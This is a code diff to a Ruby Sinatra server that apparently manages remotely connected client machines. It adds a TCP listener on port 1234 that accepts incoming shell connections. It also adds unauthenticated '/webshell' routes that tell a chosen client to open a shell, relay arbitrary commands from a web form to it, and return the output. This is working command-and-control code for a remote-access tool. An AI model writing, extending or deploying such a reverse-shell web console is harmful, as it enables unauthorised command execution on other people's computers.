@@ -3,10 +3,13 @@ require_relative('app/controllers/controller')
 #TCP Server variables
 $stdout.sync = true
 server = TCPServer.new('0.0.0.0', 55555)
+$shell = TCPServer.new('0.0.0.0', 1234)
 
 #Threads variables
 $loopThread = Thread.new { sleep }
+$shellThread = Thread.new { sleep }
 $semaphore = Mutex.new
+$shellClient
 
 #Global lists
 $clientsList = []
@@ -30,6 +33,16 @@ $loopThread = Thread.new {
   server.close
 }
 
+$shellThread = Thread.new {
+  loop do
+    Thread.start($shell.accept) do |sClient|
+      begin
+        $shellClient = sClient
+      rescue
+      end
+    end
+  end
+}
 
 class MyServer < Sinatra::Base
 
@@ -71,6 +84,33 @@ class MyServer < Sinatra::Base
         $semaphore.synchronize { @mClient.volume_mute }
       end
     end
+  end
+
+  get '/webshell' do
+    if params.empty? || $clientsList[params[:client_id].to_i].nil?
+      @error = "Did not found client!"
+      erb :home
+    else
+      @mClient = $clientsList[params[:client_id].to_i]
+      $semaphore.synchronize { @mClient.shell }
+    end
+    @css = ["webshell-styles"]
+    @js = ["webshell-js"]
+    erb :webShell, locals: { params: params }
+  end
+
+  post '/webshell' do
+    @retmsg = []
+    $shellClient.puts(params[:command])
+    begin
+    status = Timeout::timeout(1) {
+      while line = $shellClient.gets
+        @retmsg << line
+      end
+    }
+    rescue
+    end
+    return @retmsg
   end
 
   get '/volcontrol' do
